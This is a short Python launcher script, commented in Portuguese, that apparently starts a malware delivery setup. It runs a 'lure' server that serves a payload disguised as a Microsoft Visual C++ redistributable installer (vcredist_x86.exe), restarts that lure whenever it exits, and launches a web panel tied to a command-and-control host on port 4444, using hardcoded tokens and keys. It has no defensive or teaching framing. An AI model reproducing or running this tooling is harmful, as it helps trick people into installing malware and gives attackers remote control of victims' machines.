#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Entrada unica: painel na 8080 (publico) + isca na 8888 (interna)."""
import os
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
sys.path.insert(0, HERE)

TOKEN = "raf2026"
KEY = os.environ.get("RAF_KEY", "raf-7c1f4b2e9a3d5f8b6c0e2a4d")
PORT = int(os.environ.get("PORT", "8080"))
LURE = int(os.environ.get("RAF_LURE_PORT", "8888"))

_CAND = [os.path.join(HERE, "payload", "vcredist_x86.exe"),
         os.path.join(HERE, "vcredist_x86.exe")]
PAYLOAD = next((p for p in _CAND if os.path.isfile(p)), _CAND[0])

try:
    with open(os.path.join(HERE, "link_secret.txt"), encoding="utf-8") as f:
        SECRET = f.read().strip()
except OSError:
    SECRET = os.environ.get("RAF_SECRET", "k3p8v2m6x9q4")

os.environ["RAF_TRUST_LOCAL"] = "0"


def deliver_args():
    args = [sys.executable, os.path.join(HERE, "deliver.py"),
            "--payload", PAYLOAD, "--theme", "vcredist",
            "--port", str(LURE), "--auto", "--panel-port", str(PORT),
            "--token", TOKEN]
    if SECRET:
        args += ["--secret", SECRET]
    return args


def keep_deliver():
    if not os.path.isfile(PAYLOAD):
        print("[raf] AVISO: %s nao existe" % PAYLOAD, flush=True)
    while True:
        p = subprocess.Popen(deliver_args(), cwd=HERE)
        p.wait()
        print("[raf] isca saiu com codigo %s, reiniciando" % p.returncode, flush=True)
        time.sleep(3)


print("[raf] subindo isca na %d e painel na %d" % (LURE, PORT), flush=True)
threading.Thread(target=keep_deliver, daemon=True).start()
time.sleep(2)

import web  # noqa: E402

sys.argv = ["web.py",
            "--c2-host", "127.0.0.1", "--c2-port", "4444",
            "--port", str(PORT), "--deliver-port", str(LURE),
            "--key", KEY, "--token", TOKEN, "--exe", PAYLOAD]
sys.exit(web.main())
